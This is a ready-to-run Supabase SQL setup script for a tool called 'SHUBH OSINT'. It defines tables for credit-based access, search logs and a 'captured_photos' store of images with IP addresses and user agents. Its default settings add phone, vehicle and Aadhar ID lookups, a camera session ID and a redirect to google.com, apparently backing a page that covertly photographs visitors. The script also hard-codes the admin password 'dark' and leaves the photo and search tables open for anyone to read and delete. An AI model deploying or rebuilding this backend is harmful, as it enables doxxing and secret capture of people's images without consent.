-- =====================================================
-- SHUBH OSINT - Complete Supabase Database Setup
-- =====================================================
-- Run this SQL in your new Supabase project's SQL Editor
-- Last Updated: 2024-12-27
-- =====================================================

-- =====================================================
-- 1. CREATE TABLES
-- =====================================================

-- Access Passwords Table (for credit-based access system)
CREATE TABLE IF NOT EXISTS public.access_passwords (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_hash TEXT NOT NULL,
  password_display TEXT NOT NULL,
  total_credits INTEGER NOT NULL DEFAULT 0,
  remaining_credits INTEGER NOT NULL DEFAULT 0,
  is_enabled BOOLEAN NOT NULL DEFAULT true,
  is_used BOOLEAN NOT NULL DEFAULT false,
  is_unlimited BOOLEAN NOT NULL DEFAULT false,
  device_id TEXT,
  used_at TIMESTAMP WITH TIME ZONE,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- User Sessions Table (tracks active sessions)
CREATE TABLE IF NOT EXISTS public.user_sessions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  device_id TEXT NOT NULL,
  session_token TEXT NOT NULL,
  is_active BOOLEAN NOT NULL DEFAULT true,
  last_active_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Credit Usage Table (logs all credit usage)
CREATE TABLE IF NOT EXISTS public.credit_usage (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  credits_used INTEGER NOT NULL,
  search_type TEXT NOT NULL,
  search_query TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- App Settings Table (stores all app configuration)
CREATE TABLE IF NOT EXISTS public.app_settings (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  setting_key TEXT NOT NULL UNIQUE,
  setting_value JSONB NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Captured Photos Table (for camera capture feature)
CREATE TABLE IF NOT EXISTS public.captured_photos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  image_data TEXT NOT NULL,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Search History Table (logs all searches)
CREATE TABLE IF NOT EXISTS public.search_history (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  search_type TEXT NOT NULL,
  search_query TEXT NOT NULL,
  ip_address TEXT,
  searched_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- =====================================================
-- 2. ENABLE ROW LEVEL SECURITY
-- =====================================================

ALTER TABLE public.access_passwords ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.credit_usage ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_photos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.search_history ENABLE ROW LEVEL SECURITY;

-- =====================================================
-- 3. RLS POLICIES
-- =====================================================

-- Access Passwords - No direct access (only via edge functions with service role)
DROP POLICY IF EXISTS "No direct access to passwords" ON public.access_passwords;
CREATE POLICY "No direct access to passwords" ON public.access_passwords
  AS RESTRICTIVE FOR ALL USING (false);

-- User Sessions - No direct access (only via edge functions)
DROP POLICY IF EXISTS "No direct access to sessions" ON public.user_sessions;
CREATE POLICY "No direct access to sessions" ON public.user_sessions
  AS RESTRICTIVE FOR ALL USING (false);

-- Credit Usage - No direct access (only via edge functions)
DROP POLICY IF EXISTS "No direct access to credit usage" ON public.credit_usage;
CREATE POLICY "No direct access to credit usage" ON public.credit_usage
  AS RESTRICTIVE FOR ALL USING (false);

-- App Settings - Public read/write (for settings sync across devices)
DROP POLICY IF EXISTS "Anyone can read settings" ON public.app_settings;
CREATE POLICY "Anyone can read settings" ON public.app_settings
  AS RESTRICTIVE FOR SELECT USING (true);

DROP POLICY IF EXISTS "Anyone can insert settings" ON public.app_settings;
CREATE POLICY "Anyone can insert settings" ON public.app_settings
  AS RESTRICTIVE FOR INSERT WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can update settings" ON public.app_settings;
CREATE POLICY "Anyone can update settings" ON public.app_settings
  AS RESTRICTIVE FOR UPDATE USING (true);

-- Captured Photos - Public access (view, insert, delete)
DROP POLICY IF EXISTS "Anyone can view captured photos" ON public.captured_photos;
CREATE POLICY "Anyone can view captured photos" ON public.captured_photos
  AS RESTRICTIVE FOR SELECT USING (true);

DROP POLICY IF EXISTS "Allow insert for photo capture" ON public.captured_photos;
CREATE POLICY "Allow insert for photo capture" ON public.captured_photos
  AS RESTRICTIVE FOR INSERT WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can delete captured photos" ON public.captured_photos;
CREATE POLICY "Anyone can delete captured photos" ON public.captured_photos
  AS RESTRICTIVE FOR DELETE USING (true);

-- Search History - Public access (view, insert, delete)
DROP POLICY IF EXISTS "Anyone can view search history" ON public.search_history;
CREATE POLICY "Anyone can view search history" ON public.search_history
  AS RESTRICTIVE FOR SELECT USING (true);

DROP POLICY IF EXISTS "Anyone can insert search history" ON public.search_history;
CREATE POLICY "Anyone can insert search history" ON public.search_history
  AS RESTRICTIVE FOR INSERT WITH CHECK (true);

DROP POLICY IF EXISTS "Anyone can delete search history" ON public.search_history;
CREATE POLICY "Anyone can delete search history" ON public.search_history
  AS RESTRICTIVE FOR DELETE USING (true);

-- =====================================================
-- 4. FUNCTIONS AND TRIGGERS
-- =====================================================

-- Update timestamp function
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

-- Trigger for app_settings
DROP TRIGGER IF EXISTS update_app_settings_updated_at ON public.app_settings;
CREATE TRIGGER update_app_settings_updated_at
  BEFORE UPDATE ON public.app_settings
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- Trigger for access_passwords
DROP TRIGGER IF EXISTS update_access_passwords_updated_at ON public.access_passwords;
CREATE TRIGGER update_access_passwords_updated_at
  BEFORE UPDATE ON public.access_passwords
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- =====================================================
-- 5. INDEXES (for better query performance)
-- =====================================================

CREATE INDEX IF NOT EXISTS idx_app_settings_key ON public.app_settings(setting_key);
CREATE INDEX IF NOT EXISTS idx_captured_photos_session ON public.captured_photos(session_id);
CREATE INDEX IF NOT EXISTS idx_captured_photos_date ON public.captured_photos(captured_at);
CREATE INDEX IF NOT EXISTS idx_search_history_type ON public.search_history(search_type);
CREATE INDEX IF NOT EXISTS idx_search_history_date ON public.search_history(searched_at);
CREATE INDEX IF NOT EXISTS idx_access_passwords_hash ON public.access_passwords(password_hash);
CREATE INDEX IF NOT EXISTS idx_user_sessions_token ON public.user_sessions(session_token);
CREATE INDEX IF NOT EXISTS idx_user_sessions_password ON public.user_sessions(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_password ON public.credit_usage(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_date ON public.credit_usage(created_at);

-- =====================================================
-- 6. DEFAULT DATA
-- =====================================================

-- Main Settings (includes admin password, session ID, search buttons, etc.)
INSERT INTO public.app_settings (setting_key, setting_value)
VALUES ('main_settings', '{
  "adminPassword": "dark",
  "camSessionId": "shubhcam01",
  "camRedirectUrl": "https://google.com",
  "customCaptureHtml": "",
  "chromeCustomHtml": "",
  "allSearchAccessKey": "",
  "searchButtons": [
    {
      "id": "phone",
      "label": "Phone Search",
      "searchType": "phone",
      "placeholder": "Enter phone number",
      "apiUrl": "https://anmolzz.teamxferry.workers.dev/?mobile=",
      "isEnabled": true
    },
    {
      "id": "vehicle",
      "label": "Vehicle Search",
      "searchType": "vehicle",
      "placeholder": "Enter vehicle number",
      "apiUrl": "",
      "isEnabled": true
    },
    {
      "id": "aadhar",
      "label": "Aadhar Search",
      "searchType": "aadhar",
      "placeholder": "Enter Aadhar number",
      "apiUrl": "",
      "isEnabled": true
    }
  ]
}'::jsonb)
ON CONFLICT (setting_key) DO NOTHING;

-- =====================================================
-- SETUP COMPLETE!
-- =====================================================
-- After running this SQL:
-- 1. Deploy the edge functions from supabase/functions/
-- 2. Update config.toml with your project ID
-- =====================================================
